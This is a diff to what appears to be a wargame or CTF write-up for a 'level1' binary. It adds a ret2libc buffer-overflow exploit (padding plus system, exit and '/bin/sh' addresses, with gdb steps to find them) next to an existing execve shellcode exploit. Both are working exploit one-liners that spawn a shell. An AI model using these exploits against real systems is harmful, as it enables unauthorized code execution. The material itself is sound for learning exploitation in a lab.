@@ -60,3 +60,21 @@ return address of `run` is `0x08048444` which is `0x44\x84\x04\x08` in little en
 ```bash
 (python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80" + "A" * (76-23) + "\xf0\xf6\xff\xbf"'; cat) | /home/user/level1/level1
 ```
+`\xf0\xf6\xff\xbf` is the address of the buffer.
+
+
+# Or ret2libc
+
+```bash
+(python -c 'print "a" * 76 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"'; cat ) | /home/user/level1/level1
+```
+
+``` bash
+(gdb) level1
+(gdb) b *main
+(gdb) r
+```bash
+
+first: address of system `(gdb) p system`
+second: address of exit `(gdb) p exit`
+third: address of "/bin/sh" `find &system,+9999999,"/bin/sh"`
